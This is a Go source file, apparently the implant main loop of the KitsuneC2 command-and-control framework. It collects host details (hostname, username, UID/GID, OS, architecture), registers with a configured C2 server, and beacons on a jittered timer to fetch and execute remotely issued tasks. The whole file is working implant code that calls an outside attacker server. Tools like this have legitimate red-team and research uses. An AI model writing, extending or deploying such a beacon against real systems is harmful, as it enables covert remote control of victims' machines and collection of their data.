package main

import (
	"encoding/json"
	"errors"
	"math"
	"math/rand"
	"net"
	"os"
	"os/user"
	"runtime"
	"strconv"
	"time"

	"github.com/benji-k/KitsuneC2/KitsuneC2/implant/config"
	"github.com/benji-k/KitsuneC2/KitsuneC2/lib/communication"
	"github.com/benji-k/KitsuneC2/KitsuneC2/lib/cryptography"
)

const (
	implantOs   string = runtime.GOOS
	implantArch string = runtime.GOARCH
)

var (
	implantId       string = "00000000000000000000000000000000" //dynamically generated based on unique host features
	shouldTerminate bool   = false
)

func main() {
	initSuccess := initialize()

	if initSuccess {
		kitsuneLoop()
	}
}

// main loop of the implant: Sleep for x amount of time, check for server commands, execute commands
func kitsuneLoop() {
	for !shouldTerminate {
		var waitTime = math.Abs(float64(config.CallbackInterval + int(float32(config.CallbackJitter)*(0.5-rand.Float32()))))
		time.Sleep(time.Duration(waitTime) * time.Second)

		conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
		if err != nil {
			continue
		}

		receivedTasksPtr, taskArgumentsPtr, err := checkIn(conn)
		if err != nil {
			conn.Close()
			continue
		}
		conn.Close()

		for i := range *receivedTasksPtr {
			executeTask((*receivedTasksPtr)[i], (*taskArgumentsPtr)[i])
		}
	}
}

// Gathers basic information about the system, generates a unque implant ID, and sends a message of type "ImplantRegister" to the server.
func initialize() bool {
	var currentUser, _ = user.Current()
	var hostname, _ = os.Hostname()
	implantId = cryptography.GenerateMd5FromStrings(hostname, currentUser.Username, config.ImplantName) //Generates unique ID based on hostname, username and implantName

	msg := communication.ImplantRegisterReq{ImplantId: implantId, ImplantName: config.ImplantName, Hostname: hostname, Username: currentUser.Username, UID: currentUser.Uid, GID: currentUser.Gid, Os: implantOs, Arch: implantArch}

	attempts := 0
	success := false

	for attempts < config.MaxRegisterRetryCount && !success { //We try to connect to the server "maxRegisterRetryCount" times
		time.Sleep(time.Duration(attempts) * time.Minute) //with each failed attempt, we wait a bit longer.
		attempts++

		conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
		if err != nil {
			continue
		}
		err = SendEnvelopeToServer(conn, communication.IMPLANT_REGISTER_REQ, msg)
		if err != nil {
			conn.Close()
			continue
		}

		messageType, data, err := ReceiveEnvelopeFromServer(conn)
		if err != nil {
			conn.Close()
			continue
		}
		if messageType != communication.IMPLANT_REGISTER_RESP { //server should send a ImplantRegisterResp message
			conn.Close()
			continue
		}
		conn.Close()
		registerResp := data.(*communication.ImplantRegisterResp)
		success = registerResp.Success
	}

	if !success { //if we have tried to register MaxRegisterRetryCount, and still failed, we give up and kill the implant.
		return false
	} else {
		return true
	}
}

// Sends message of type "ImplantCheckin" to server and returns (if any) a list of tasks with their arguments.
func checkIn(conn net.Conn) (*[]int, *[]interface{}, error) {
	msg := communication.ImplantCheckinReq{ImplantId: implantId}

	err := SendEnvelopeToServer(conn, communication.IMPLANT_CHECKIN_REQ, msg)
	if err != nil {
		return nil, nil, err
	}

	messageType, data, err := ReceiveEnvelopeFromServer(conn)
	if err != nil {
		return nil, nil, err
	}
	if messageType != communication.IMPLANT_CHECKIN_RESP {
		return nil, nil, errors.New("Expected implantCheckinResp but got: " + strconv.Itoa(messageType))
	}
	checkInResp, ok := data.(*communication.ImplantCheckinResp)
	if !ok {
		return nil, nil, errors.New("could not convert message to ImplantCheckinResp")
	}

	//The checkInResp objects contains 2 arrays. The first int array contains the task types. The 2nd 2d byte array contains
	//the arguments belonging to each task. We need to unmarshal the 2nd array to the corresponding taskArgument structs.
	var argumentsAsStructs []interface{} = make([]interface{}, len(checkInResp.TaskArguments)) //Create a struct array with the length of the amount of arguments we received
	for i := range argumentsAsStructs {
		dataAsStruct := communication.MessageTypeToStruct[checkInResp.TaskTypes[i]]() //Determine struct that we should unmarshal to based on TaskType
		err = json.Unmarshal(checkInResp.TaskArguments[i], dataAsStruct)
		if err != nil {
			continue
		}
		argumentsAsStructs[i] = dataAsStruct //Assign unmarshalled struct to array
	}

	return &checkInResp.TaskTypes, &argumentsAsStructs, nil
}

func executeTask(taskType int, arguments interface{}) {
	conn, err := net.Dial("tcp", config.ServerIp+":"+strconv.Itoa(config.ServerPort))
	if err != nil {
		return
	}
	defer conn.Close()

	handlerFunc := MessageTypeToFunc[taskType]
	handlerFunc(conn, arguments)
}
